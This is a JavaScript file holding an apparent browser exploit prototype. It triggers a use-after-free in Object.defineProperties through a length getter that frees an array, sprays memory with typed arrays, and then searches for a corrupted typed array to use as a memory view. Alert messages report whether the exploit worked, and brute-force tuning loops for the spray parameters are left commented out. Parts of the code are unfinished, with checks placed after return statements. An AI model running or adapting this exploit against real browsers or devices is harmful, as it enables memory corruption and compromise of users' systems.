function tryexploit(a_c, p_c){
	console.log("tryexploit: a_c=" + a_c + ", p_c=" + p_c);
	try{
		var arr = new Array(2047);
		var not_number = {};
		var attempts = new Array(a_c);
		var pressure = new Array(p_c);
		var props = {
			p0 : { value : 0 },
			p1 : { value : 1 },
			p2 : { value : 2 },
			p3 : { value : 3 },
			p4 : { value : 4 },
			p5 : { value : 5 },
			p6 : { value : 6 },
			p7 : { value : 7 },
			p8 : { value : 8 },
			length : { value : not_number },
			stale : { value : arr },
			after : { value : 666 }
		};
		not_number.toString = function() {
			// Remove reference to arr, so that JS will be able to free it the props JSArray
			arr = null;
			props['stale']['value'] = null;
			
			// Allocate pressure arrays
			for (var i = 0; i < pressure.length; i++) {
				pressure[i] = new Uint32Array(262144);
			}
			
			//
			var buffer = new ArrayBuffer(80);
			var uintArray = new Uint32Array(buffer);
			uintArray[0] = 0xAABBCCDD;
			for (i = 0; i < attempts.length; i++) {
				attempts[i] = new Uint32Array(buffer);
			}
			return 10;
		}

		var target = [];
		var before_len = arr.length;
		Object.defineProperties(target, props);
		var stale = target.stale;
		var after_len = stale.length;
		if (before_len == after_len) {
			alert("Exploit Failed.");
			return 0;
		} else {
			alert("Exploit Worked.");
			
			for (x = attempts.length - 1; x >= 1; x--) 
			{ 
				if (attempts[x].length != 80 / 4) // Check if this array has the original backing arraybuffer(or a length of 80 / 4)
				{
					alert("Found non JSArray type");
					return 1;
					if (attempts[x].length == -1) // Check if the length is 0xFFFFFFFF (-1), if so it is the JSGenericTypedArrayView type
					{
						memory_view = attempts[x];
						alert("Found JSGenericTypedArrayView");
						alert("tryexploit: a_c=" + a_c + ", p_c=" + p_c);
						return 1;
						break;
					}
				}
			}
			
			alert("after loop");
		}
	} 
	catch(err){
		//alert("Expection:" + err);
		return 0;
	}
}


tryexploit(1000000-100000, 50);
//ac = 4250000;
//pc = 100;
//ac = 71000;
//pc = 1;
//tryexploit(ac, pc);

//for(pc=0; pc<100; pc++){
//	for(ac=0; ac < 4250000 ; ac += 1000){
//		tryexploit(ac, pc);
		//if(tryexploit(ac, pc) == 1){
		//	alert("Exploit worked! ac=" + ac + ", pc=" + pc);
		//}
//	}
//}
